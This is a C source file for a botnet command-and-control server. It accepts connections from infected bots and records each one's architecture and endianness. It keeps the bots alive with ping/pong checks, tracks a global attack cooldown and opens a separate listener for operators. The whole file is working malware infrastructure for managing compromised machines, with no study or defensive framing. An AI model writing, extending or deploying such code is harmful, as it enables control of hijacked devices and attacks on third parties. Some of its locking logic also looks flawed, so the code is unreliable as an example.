#include "headers/botnet.h"
#include "headers/user_handler.h"
#include "headers/logger.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdbool.h>
#include <netinet/tcp.h>
#include <errno.h>
#include <sys/time.h>
#include <sys/epoll.h>

Bot bots[MAX_BOTS];
int bot_count = 0;
int global_cooldown = 0;
pthread_mutex_t bot_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t cooldown_mutex = PTHREAD_MUTEX_INITIALIZER;

void* handle_bot(void* arg) {
    int bot_socket = *((int*)arg);
    int bot_index = -1;
    pthread_mutex_lock(&bot_mutex);
    for(int i = 0; i < bot_count; i++) {
        if(bots[i].socket == bot_socket) {
            bot_index = i;
            break;
        }
    }
    pthread_mutex_unlock(&bot_mutex);
    if(bot_index == -1) {
        close(bot_socket);
        free(arg);
        return NULL;
    }
    free(arg);

    struct timeval timeout;
    timeout.tv_sec = 30;
    timeout.tv_usec = 0;
    setsockopt(bot_socket, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
    setsockopt(bot_socket, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));

    int epoll_fd = epoll_create1(0);
    if (epoll_fd == -1) {
        pthread_mutex_lock(&bot_mutex);
        bots[bot_index].is_valid = 0;
        pthread_mutex_unlock(&bot_mutex);
        close(bot_socket);
        return NULL;
    }

    struct epoll_event ev;
    ev.events = EPOLLIN | EPOLLET;
    ev.data.fd = bot_socket;
    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, bot_socket, &ev) == -1) {
        close(epoll_fd);
        pthread_mutex_lock(&bot_mutex);
        bots[bot_index].is_valid = 0;
        pthread_mutex_unlock(&bot_mutex);
        close(bot_socket);
        return NULL;
    }

    char buffer[MAX_COMMAND_LENGTH] = {0};
    ssize_t len;
    while (1) {
        struct epoll_event events[1];
        int nfds = epoll_wait(epoll_fd, events, 1, 30000);
        if (nfds > 0 && events[0].data.fd == bot_socket) {
            memset(buffer, 0, sizeof(buffer));
            len = recv(bot_socket, buffer, sizeof(buffer) - 1, 0);
            if (len <= 0) {
                if (errno == EAGAIN || errno == EWOULDBLOCK || errno == EINTR) {
                    continue;
                }
                break;
            }
            buffer[len] = 0;
            if (strncmp(buffer, "ping", 4) == 0) {
                char pong[64];
                snprintf(pong, sizeof(pong), "pong %s", bots[bot_index].arch);
                send(bot_socket, pong, strlen(pong), MSG_NOSIGNAL);
                continue;
            }
            int valid = 1;
            for (ssize_t i = 0; i < len; i++) {
                if ((unsigned char)buffer[i] < 0x09 || ((unsigned char)buffer[i] > 0x0D && (unsigned char)buffer[i] < 0x20) || (unsigned char)buffer[i] > 0x7E) {
                    valid = 0;
                    break;
                }
            }
            if (!valid) break;
        }
    }
    close(epoll_fd);
    pthread_mutex_lock(&bot_mutex);
    bots[bot_index].is_valid = 0;
    pthread_mutex_unlock(&bot_mutex);
    close(bot_socket);
    return NULL;
}

void* bot_listener(void* arg) {
    int botport = *((int*)arg);
    int bot_server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (bot_server_socket < 0) return NULL;
    int optval = 1;
    setsockopt(bot_server_socket, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval));
    setsockopt(bot_server_socket, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
    
    int keepalive_time = 30;
    int keepalive_intvl = 5;  
    int keepalive_probes = 5; 
    setsockopt(bot_server_socket, SOL_TCP, TCP_KEEPIDLE, &keepalive_time, sizeof(keepalive_time));
    setsockopt(bot_server_socket, SOL_TCP, TCP_KEEPINTVL, &keepalive_intvl, sizeof(keepalive_intvl));
    setsockopt(bot_server_socket, SOL_TCP, TCP_KEEPCNT, &keepalive_probes, sizeof(keepalive_probes));
    
    struct sockaddr_in bot_server_addr;
    memset(&bot_server_addr, 0, sizeof(bot_server_addr));
    bot_server_addr.sin_family = AF_INET;
    bot_server_addr.sin_addr.s_addr = INADDR_ANY;
    bot_server_addr.sin_port = htons(botport);
    if (bind(bot_server_socket, (struct sockaddr*)&bot_server_addr, sizeof(bot_server_addr)) < 0) {
        close(bot_server_socket);
        return NULL;
    }
    listen(bot_server_socket, MAX_BOTS);

    while (1) {
        struct sockaddr_in client_addr;
        socklen_t client_len = sizeof(client_addr);
        int *bot_socket = malloc(sizeof(int));
        bool found_duplicate = false;
        if (!bot_socket) continue;
        
        *bot_socket = accept(bot_server_socket, (struct sockaddr*)&client_addr, &client_len);
        if (*bot_socket < 0) {
            free(bot_socket);
            continue;
        }

        setsockopt(*bot_socket, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval));
        setsockopt(*bot_socket, SOL_TCP, TCP_KEEPIDLE, &keepalive_time, sizeof(keepalive_time));
        setsockopt(*bot_socket, SOL_TCP, TCP_KEEPINTVL, &keepalive_intvl, sizeof(keepalive_intvl));
        setsockopt(*bot_socket, SOL_TCP, TCP_KEEPCNT, &keepalive_probes, sizeof(keepalive_probes));

        char archbuf[64] = {0};
        fd_set readfds;
        struct timeval tv;
        FD_ZERO(&readfds);
        FD_SET(*bot_socket, &readfds);
        tv.tv_sec = 5;
        tv.tv_usec = 0;
        
        if (select(*bot_socket + 1, &readfds, NULL, NULL, &tv) > 0) {
            ssize_t archlen = recv(*bot_socket, archbuf, sizeof(archbuf)-1, MSG_DONTWAIT);
            if (archlen > 0) {
                archbuf[archlen] = 0;
                pthread_mutex_lock(&bot_mutex);
                
                for (int i = 0; i < bot_count; i++) {
                    if (bots[i].is_valid && bots[i].address.sin_addr.s_addr == client_addr.sin_addr.s_addr) {
                        char test = 0;
                        if (send(bots[i].socket, &test, 0, MSG_NOSIGNAL) < 0) {
                            close(bots[i].socket);
                            bots[i].is_valid = 0;
                        } else {
                            found_duplicate = true;
                            close(*bot_socket);
                            free(bot_socket);
                            pthread_mutex_unlock(&bot_mutex);
                            break;
                        }
                    }
                }
                
                if (!found_duplicate && bot_count < MAX_BOTS) {
                    int new_count = 0;
                    for (int i = 0; i < bot_count; i++) {
                        if (bots[i].is_valid) {
                            if (i != new_count) {
                                bots[new_count] = bots[i];
                            }
                            new_count++;
                        }
                    }
                    bot_count = new_count;
                    
                    bots[bot_count].socket = *bot_socket;
                    bots[bot_count].address = client_addr;
                    bots[bot_count].is_valid = 1;
                    strncpy(bots[bot_count].arch, archbuf, sizeof(bots[bot_count].arch)-1);
                    bots[bot_count].arch[sizeof(bots[bot_count].arch)-1] = 0;
                    
                    send(*bot_socket, "ping", 4, MSG_NOSIGNAL);
                    memset(archbuf, 0, sizeof(archbuf));
                    
                    FD_ZERO(&readfds);
                    FD_SET(*bot_socket, &readfds);
                    tv.tv_sec = 5;
                    tv.tv_usec = 0;
                    
                    if (select(*bot_socket + 1, &readfds, NULL, NULL, &tv) > 0) {
                        ssize_t ponglen = recv(*bot_socket, archbuf, sizeof(archbuf)-1, MSG_DONTWAIT);
                        if (ponglen > 0 && strncmp(archbuf, "pong ", 5) == 0) {
                            char ipbuf[32];
                            inet_ntop(AF_INET, &client_addr.sin_addr, ipbuf, sizeof(ipbuf));
                            const char* endian = (htonl(0x12345678) == 0x12345678) ? "Big_Endian" : "Little_Endian";
                            char logarch[128];
                            char* arch = archbuf + 5;
                            snprintf(logarch, sizeof(logarch), "Endian: %s | Architecture: %s", endian, arch);
                            log_bot_join(logarch, ipbuf);
                            bot_count++;
                            
                            pthread_t bot_thread;
                            pthread_create(&bot_thread, NULL, handle_bot, bot_socket);
                            pthread_detach(bot_thread);
                            pthread_mutex_unlock(&bot_mutex);
                            continue;
                        }
                    }
                }
                pthread_mutex_unlock(&bot_mutex);
            }
        }
        
        if (!found_duplicate) {
            close(*bot_socket);
            free(bot_socket);
        }
    }
    close(bot_server_socket);
    return NULL;
}

void* ping_bots(void* arg) {
    char pongbuf[64];
    struct timeval last_ping = {0};
    static int epoll_fd = -1;
    if (epoll_fd == -1) {
        epoll_fd = epoll_create1(0);
    }
    struct epoll_event ev, events[MAX_BOTS];
    
    while (1) {
        struct timeval now;
        gettimeofday(&now, NULL);
        
        if (now.tv_sec - last_ping.tv_sec < 15) {
            usleep(100000);
            continue;
        }
        
        pthread_mutex_lock(&bot_mutex);
        int current_pos = 0;
        
        for (int i = 0; i < bot_count; i++) {
            if (!bots[i].is_valid) continue;
            
            int error = 0;
            socklen_t len = sizeof(error);
            if (getsockopt(bots[i].socket, SOL_SOCKET, SO_ERROR, &error, &len) < 0 || error != 0) {
                close(bots[i].socket);
                bots[i].is_valid = 0;
                continue;
            }
            char ipbuf[32];
            inet_ntop(AF_INET, &bots[i].address.sin_addr, ipbuf, sizeof(ipbuf));
            int res = send(bots[i].socket, "ping", 4, MSG_NOSIGNAL | MSG_DONTWAIT);
            if (res < 0) {
                if (errno == EAGAIN || errno == EWOULDBLOCK || errno == EINTR) {
                    if (current_pos != i) {
                        bots[current_pos] = bots[i];
                    }
                    current_pos++;
                    continue;
                }
                close(bots[i].socket);
                bots[i].is_valid = 0;
                continue;
            }
            ev.events = EPOLLIN;
            ev.data.fd = bots[i].socket;
            epoll_ctl(epoll_fd, EPOLL_CTL_ADD, bots[i].socket, &ev);
        }
        int nfds = epoll_wait(epoll_fd, events, bot_count, 2000);
        for (int n = 0; n < nfds; n++) {
            int fd = events[n].data.fd;
            memset(pongbuf, 0, sizeof(pongbuf));
            ssize_t ponglen = recv(fd, pongbuf, sizeof(pongbuf)-1, MSG_DONTWAIT);
            if (ponglen > 0 && strncmp(pongbuf, "pong ", 5) == 0) {
                for (int i = 0; i < bot_count; i++) {
                    if (bots[i].socket == fd && bots[i].is_valid) {
                        if (current_pos != i) {
                            bots[current_pos] = bots[i];
                        }
                        current_pos++;
                        break;
                    }
                }
            } else {
                for (int i = 0; i < bot_count; i++) {
                    if (bots[i].socket == fd && bots[i].is_valid) {
                        close(bots[i].socket);
                        bots[i].is_valid = 0;
                        break;
                    }
                }
            }
            epoll_ctl(epoll_fd, EPOLL_CTL_DEL, fd, NULL);
        }
        for (int i = 0; i < bot_count; i++) {
            if (!bots[i].is_valid) continue;
            int found = 0;
            for (int n = 0; n < nfds; n++) {
                if (events[n].data.fd == bots[i].socket) {
                    found = 1;
                    break;
                }
            }
            if (!found) {
                if (send(bots[i].socket, "", 0, MSG_NOSIGNAL) >= 0) {
                    if (current_pos != i) {
                        bots[current_pos] = bots[i];
                    }
                    current_pos++;
                } else {
                    close(bots[i].socket);
                    bots[i].is_valid = 0;
                }
            }
        }
        bot_count = current_pos;
        pthread_mutex_unlock(&bot_mutex);
        sleep(6); 
    }
    return NULL;
}

void* manage_cooldown(void* arg) {
    while (1) {
        pthread_mutex_lock(&cooldown_mutex);
        if (global_cooldown > 0) {
            global_cooldown--;
        }
        pthread_mutex_unlock(&cooldown_mutex);
        sleep(1);
    }
    return NULL;
}

void* cnc_listener(void* arg) {
    int cncport = *((int*)arg);
    int server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket < 0) return NULL;
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(cncport);
    int optval = 1;
    setsockopt(server_socket, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval));
    setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
    if (bind(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        close(server_socket);
        return NULL;
    }
    listen(server_socket, 16);
    while (1) {
        struct sockaddr_in client_addr;
        socklen_t client_len = sizeof(client_addr);
        int *client_socket = malloc(sizeof(int));
        if (!client_socket) continue;
        *client_socket = accept(server_socket, (struct sockaddr*)&client_addr, &client_len);
        if (*client_socket < 0) {
            free(client_socket);
            continue;
        }
        pthread_t client_thread;
        pthread_create(&client_thread, NULL, handle_client, client_socket);
        pthread_detach(client_thread);
    }
    close(server_socket);
    return NULL;
}
